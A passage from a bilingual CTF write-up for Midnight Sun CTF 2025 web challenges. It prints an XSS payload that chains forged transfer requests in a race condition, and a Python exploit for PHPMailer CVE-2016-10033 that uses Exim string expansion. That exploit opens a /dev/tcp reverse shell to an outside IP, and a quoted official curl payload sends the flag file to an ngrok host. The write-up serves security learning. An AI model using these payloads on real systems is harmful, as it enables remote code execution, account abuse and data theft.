</span></span><span class="line"><span class="cl">  <span class="s1">&#39;method&#39;</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;body&#39;</span><span class="o">:</span> <span class="s1">&#39;recipient=ADD_USER_HERE&amp;amount=1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;credentials&#39;</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">html</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">html</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">html</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">doc</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="s1">&#39;text/html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">[...</span><span class="nx">doc</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;table &gt; tbody &gt; tr &gt; td:first-child&#39;</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">canidates</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">canidates</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">item</span><span class="p">.</span><span class="nx">innerText</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">canidates</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">canidates</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">item</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">item</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">canidates</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(...</span><span class="nx">canidates</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">tid</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">tid</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">tid</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://web:8000/?action=create-transaction&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;headers&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;content-type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;method&#39;</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;body&#39;</span><span class="o">:</span> <span class="s1">&#39;recipient=ADD_USER_HERE&amp;amount=1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;credentials&#39;</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">resp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://web:8000/?action=create-transaction&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;headers&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;content-type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;method&#39;</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;body&#39;</span><span class="o">:</span> <span class="s1">&#39;recipient=ADD_USER_HERE&amp;amount=999999989&amp;transaction_id=&#39;</span> <span class="o">+</span> <span class="nx">tid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;credentials&#39;</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>用的<code>&lt;img src=x onerror=&quot;eval(atob('playload'))&quot;/&gt;</code>注意下编码问题即可，最后再次感谢HighDex
用英文说一遍:</p>
<p>Use <code>&lt;img src=x onerror=&quot;eval(atob('playload'))&quot;/&gt;</code>, just watch out for encoding issues. Finally, again, many thanks to HighDex.
In English:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">I’m very grateful to HighDex who get firstplace at this competition, Congratulations!
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/7.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/7.png, /img/Midnight-Sun-CTF-2025-WEB/7.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/7.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/7.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/7.png" ></figure></p>
<p><figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/8.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/8.png, /img/Midnight-Sun-CTF-2025-WEB/8.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/8.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/8.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/8.png" ></figure>
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/9.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/9.png, /img/Midnight-Sun-CTF-2025-WEB/9.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/9.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/9.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/9.png" ></figure></p>
<h2 id="uselesscorp" class="headerLink">
    <a href="#uselesscorp" class="header-mark"></a><strong>Uselesscorp</strong></h2><p>扫了一下目录</p>
<p>Scanned the directories:
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/10.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/10.png, /img/Midnight-Sun-CTF-2025-WEB/10.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/10.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/10.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/10.png" ></figure>
看到<code>class.phpmailer.php</code>的日期找到对应版本为v5.2.17</p>
<p>Found <code>class.phpmailer.php</code> and determined its version is v5.2.17:
<a href="https://github.com/PHPMailer/PHPMailer/blob/v5.2.17/class.phpmailer.php" target="_blank" rel="noopener noreferrer">https://github.com/PHPMailer/PHPMailer/blob/v5.2.17/class.phpmailer.php</a></p>
<p>打CVE 2016-10033</p>
<p>Tried CVE-2016-10033 using this exploit:</p>
<p>exp: <a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener noreferrer">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>但是发现打不通，说明环境可能和原本的不大一样。
原来是在这里:</p>
<p>But it didn’t work — possibly due to environment differences.
Turns out the reason is here:
<figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/11.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/11.png, /img/Midnight-Sun-CTF-2025-WEB/11.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/11.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/11.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/11.png" ></figure>
debian系统一般会用到exim4的MTA，所以我们就去看doc:</p>
<p>Debian systems often use Exim4 as MTA, so we checked the docs:
<a href="https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html" target="_blank" rel="noopener noreferrer">https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html</a></p>
<p>发现了如下几个好玩的东西:</p>
<ul>
<li>${readfile{<filename>}{<replace>}}可以读取文件然后将其中的换行符替换掉</li>
<li>${readsocket{&hellip;}{&hellip;}{&hellip;}{&hellip;}{&hellip;}}向本地或远程 socket 发送请求字符串，读取响应数据，并将其插入到当前字符串中。适用于与其他服务通信，如 Redis、Python 微服务、SMTP、HTTP 接口等。</li>
<li>${run,preexpand{option}}运行一个外部命令，将其标准输出作为变量 <code>$value</code>，并依据返回码决定使用哪个返回值。</li>
</ul>
<p>Found some interesting things:</p>
<ul>
<li>
<p>${readfile{<filename>}{<replace>}} reads file content and replaces newline characters</p>
</li>
<li>
<p>${readsocket{&hellip;}{&hellip;}{&hellip;}{&hellip;}{&hellip;}} sends request to socket (local/remote), reads response, useful for communicating with services like Redis, Python microservices, etc.</p>
</li>
<li>
<p>${run,preexpand{option}} executes an external command and uses its stdout as <code>$value</code></p>
</li>
</ul>
<p>所以我们可以构造一下sendmail的请求:
注意一下这里的email的格式，遵循RFC 3696,我们用&quot;来闭合前面的引号然后用-Ov来让后面的语句无效,这个是HighDex师傅告诉我的，基本上都适用，我们也可以用一个极短的例如<code>@d</code></p>
<p>So we can craft a sendmail request:
Note the email format — according to RFC 3696, we use &quot; to escape and close the previous quote, then use -Ov to nullify the following content. This trick was shared by HighDex, and it&rsquo;s widely applicable. We can also use a short one like <code>@d</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">delete</span><span class="o">&amp;</span><span class="n">email</span><span class="o">=</span><span class="s2">&#34;a</span><span class="se">\&#34;</span><span class="s2"> -be playload -Ov=&#34;</span><span class="err">@</span><span class="n">q</span><span class="o">.</span><span class="n">com</span><span class="o">&amp;</span><span class="n">subject</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">message</span><span class="o">=</span><span class="n">Pwned</span><span class="o">&amp;</span><span class="n">submit</span><span class="o">=</span><span class="n">submit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>于是最后的exp：</p>
<p>Final exploit:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.174.128&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Rev_Ip</span> <span class="o">=</span> <span class="s2">&#34;101.132.122.178&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Rev_Port</span> <span class="o">=</span> <span class="s2">&#34;9999&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_mail</span><span class="p">(</span><span class="n">mail</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;name&#34;</span> <span class="p">:</span> <span class="s2">&#34;delete&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;email&#34;</span> <span class="p">:</span> <span class="n">mail</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;subject&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;message&#34;</span> <span class="p">:</span> <span class="s2">&#34;Pwned!&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;submit&#34;</span> <span class="p">:</span> <span class="s2">&#34;submit&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/index.php&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;send mail:</span><span class="si">{</span><span class="n">mail</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_exp</span><span class="p">(</span><span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">base64_cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span> <span class="o">=</span> <span class="s2">&#34;${run,preexpand{${base64d:&#34;</span><span class="o">+</span><span class="n">base64_cmd</span><span class="o">+</span><span class="s2">&#34;}}}&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Your playload is </span><span class="si">{</span><span class="n">exploit</span><span class="si">}</span><span class="s2">, now I send it to the server!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">send_mail</span><span class="p">(</span><span class="s1">&#39;&#34;a</span><span class="se">\\</span><span class="s1">&#34; -be &#39;</span> <span class="o">+</span>  <span class="n">exploit</span> <span class="o">+</span> <span class="s1">&#39; &#34;@d&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_shell</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">Rev_Ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">Rev_Port</span><span class="si">}</span><span class="s2"> 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">run_exp</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/bin/sh -c </span><span class="se">\&#34;</span><span class="s2">echo -n &#39;</span><span class="si">{</span><span class="n">get_shell</span><span class="si">}</span><span class="s2">&#39; &gt;&gt; /tmp/delete</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">run_exp</span><span class="p">(</span><span class="s2">&#34;/bin/bash /tmp/delete&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">run_exp</span><span class="p">(</span><span class="s2">&#34;/bin/rm /tmp/delete&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><img
        
        loading="lazy"
        src="/img/Midnight-Sun-CTF-2025-WEB/12.png"
        srcset="/img/Midnight-Sun-CTF-2025-WEB/12.png, /img/Midnight-Sun-CTF-2025-WEB/12.png 1.5x, /img/Midnight-Sun-CTF-2025-WEB/12.png 2x"
        alt="/img/Midnight-Sun-CTF-2025-WEB/12.png"
        title="/img/Midnight-Sun-CTF-2025-WEB/12.png" ></figure></p>
<p>其他playload（官方给的）:</p>
<p>Other payloads (from the official writeup):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -X POST https://useless-94tszh4z.ctf.pro -d &#39;name=a&#39; -d &#39;subject=a&#39; -d &#39;message=a&#39; -d &#39;submit=submit&#39; -d &#39;email=&#34;\&#34; -be ${readsocket{inet:0.tcp.ap.ngrok.io:19066}{${readfile{/flag.txt}}}} &#34;@x&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>不过思路也是差不多的，只是一个直接read了我是弹shell</p>
<p>But the idea is basically the same — just that the official one directly reads the flag, while I went for a reverse shell.</p>
<h2 id="写在最后" class="headerLink">
    <a href="#%e5%86%99%e5%9c%a8%e6%9c%80%e5%90%8e" class="header-mark"></a>写在最后</h2><p>写双语的原因是起初写完后发到midnight的discord上了，但是有师傅批判说哪有人用母语写文章的(XD)，于是考虑到国内和国外的的用户，我就写成了这样子。</p></div>

        

<div class="sponsor">
        <div class="sponsor-avatar"><img
        
        loading="lazy"
        src="/images/1.jpg"
        srcset="/images/1.jpg, /images/1.jpg 1.5x, /images/1.jpg 2x"
        alt="/images/1.jpg"
        title="/images/1.jpg" height="750"   width="750" ></div><p class="sponsor-bio"><em>如果你觉得这篇文章对你有所帮助，欢迎赞赏~</em></p><a href="https://delete.love/reward.jpg" title="Sponsor" target="_blank" class="sponsor-button" rel="noopener noreferrer">
                <i class="far fa-heart fa-fw icon" style="color: #ec6cb9;"></i>
                <span>Sponsor</span>
            </a></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-05-22</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share"></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/xss/">xss</a>,&nbsp;<a href="/tags/sendmail/">sendmail</a>,&nbsp;<a href="/tags/race-conditon/">race conditon</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/classloader-learning/" class="prev" rel="prev" title="Classloader Learning"><i class="fas fa-angle-left fa-fw"></i>Classloader Learning</a></div>
</div>
<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
            </noscript><div id="waline" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><link rel="stylesheet" href="/lib/waline/waline.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{"waline":{"comment":true,"copyright":true,"dark":"body[theme='dark'], body[theme='black']","el":"#waline","lang":"en","pageview":true,"serverURL":"https://comment.delete.love/"}},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="/lib/waline/waline.js" defer></script><script type="text/javascript" src="/js/waline.min.js" defer></script></div>
</body>

</html>
